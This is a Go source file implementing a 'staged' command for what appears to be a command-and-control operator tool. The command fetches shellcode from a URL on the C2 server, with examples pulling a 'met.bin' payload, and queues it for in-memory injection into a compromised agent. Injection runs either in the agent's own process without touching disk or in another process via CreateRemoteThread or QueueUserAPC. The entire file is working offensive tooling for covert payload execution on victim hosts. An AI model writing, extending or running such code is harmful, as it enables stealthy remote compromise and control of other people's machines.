package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"

	"github.com/spf13/cobra"
)

// staged <agent-id> <url> [--method crt|apc|self] [--wait] [--timeout N]
var stagedCmd = &cobra.Command{
	Use:   "staged <agent-id> <url>",
	Short: "Staged in-memory payload delivery (download + inject in one step)",
	Long: `Download shellcode from a URL on the C2 server and inject it into the agent
in-memory in a single command. The payload is never written to disk on the agent.

Methods:
  crt   — inject into agent's own process via CreateRemoteThread (use with --pid)
  apc   — inject via QueueUserAPC (use with --pid)
  self  — execute in agent's own process (default, fileless)

Examples:
  staged 7d019eb7 http://192.168.1.10:8080/met.bin
  staged 7d019eb7 http://192.168.1.10:8080/met.bin --method self --wait
  staged 7d019eb7 http://192.168.1.10:8080/met.bin --method crt --pid 1234`,
	Args: cobra.ExactArgs(2),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		url := args[1]

		method, _ := cmd.Flags().GetString("method")
		pid, _ := cmd.Flags().GetUint32("pid")
		wait, _ := cmd.Flags().GetBool("wait")
		timeout, _ := cmd.Flags().GetInt("timeout")

		if method == "" {
			method = "self"
		}
		if (method == "crt" || method == "apc") && pid == 0 {
			printError("--pid is required for crt and apc methods")
			os.Exit(1)
		}

		printInfo(fmt.Sprintf("Fetching payload from %s ...", url))
		sc, err := fetchPayload(url)
		if err != nil {
			printError(fmt.Sprintf("Fetch failed: %v", err))
			os.Exit(1)
		}
		if len(sc) == 0 {
			printError("Fetched payload is empty")
			os.Exit(1)
		}
		printSuccess(fmt.Sprintf("Fetched %d bytes", len(sc)))

		b64 := base64.StdEncoding.EncodeToString(sc)

		var (
			endpoint string
			payload  []byte
		)
		switch method {
		case "self":
			endpoint = "/api/v1/agent/" + agentID + "/inject/self"
			payload, _ = json.Marshal(map[string]string{
				"shellcode_b64": b64,
			})
		default: // crt, apc
			endpoint = "/api/v1/agent/" + agentID + "/inject/remote"
			payload, _ = json.Marshal(map[string]interface{}{
				"shellcode_b64": b64,
				"pid":           pid,
				"method":        method,
			})
		}

		body, err := makeAPIRequestWithMethod("POST", endpoint,
			bytes.NewBuffer(payload), "application/json")
		if err != nil {
			printError(fmt.Sprintf("Staged inject failed: %v", err))
			os.Exit(1)
		}
		var resp APIResponse
		if err := json.Unmarshal(body, &resp); err != nil || !resp.Success {
			msg := "unknown error"
			if resp.Error != "" {
				msg = resp.Error
			}
			printError(fmt.Sprintf("Staged inject failed: %s", msg))
			os.Exit(1)
		}

		dataMap, _ := resp.Data.(map[string]interface{})
		cmdID, _ := dataMap["command_id"].(string)

		switch method {
		case "self":
			printSuccess(fmt.Sprintf("Staged fileless execution queued: %d bytes in-memory", len(sc)))
		default:
			printSuccess(fmt.Sprintf("Staged injection queued: %d bytes → PID %d via %s", len(sc), pid, method))
		}

		if wait && cmdID != "" {
			printInfo(fmt.Sprintf("Waiting for result (timeout %ds)...", timeout))
			if finalData, ok := waitForCommand(cmdID, timeout).(map[string]interface{}); ok {
				displayFinalCommandStatus(finalData, cmdID)
			}
		} else if cmdID != "" {
			printInfo(fmt.Sprintf("command_id: %s", cmdID))
		}
	},
}

// fetchPayload downloads raw bytes from url.
func fetchPayload(url string) ([]byte, error) {
	resp, err := http.Get(url) //nolint:gosec
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("server returned %s", resp.Status)
	}
	return io.ReadAll(resp.Body)
}
